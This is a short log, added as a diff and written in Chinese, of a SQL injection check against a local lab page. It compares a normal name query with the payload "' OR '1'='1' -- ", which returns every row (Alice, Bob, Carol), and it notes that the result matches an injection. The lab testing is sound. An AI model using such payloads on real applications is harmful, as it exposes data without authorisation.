@@ -1,0 +1,18 @@
+[*] 目标: http://127.0.0.1:4280/lab_cases/S001/index.php
+[*] 普通对照 name = 'Alice'
+[*] 普通对照 HTTP 状态: 200
+[*] 普通对照正文片段:
+<h1>查询结果</h1><p>ID 1：Alice</p>
+
+[*] 测试输入 name = "' OR '1'='1' -- "
+[*] 测试输入 HTTP 状态: 200
+[*] 测试输入正文片段:
+<h1>查询结果</h1><p>ID 1：Alice</p><p>ID 2：Bob</p><p>ID 3：Carol</p>
+
+[实际观察]
+普通对照包含 Alice: True
+普通对照包含 Bob: False
+普通对照包含 Carol: False
+测试输入包含 Bob: True
+测试输入包含 Carol: True
+观察结果与SQL注入路径的预期一致：测试输入改变了查询结果集合。
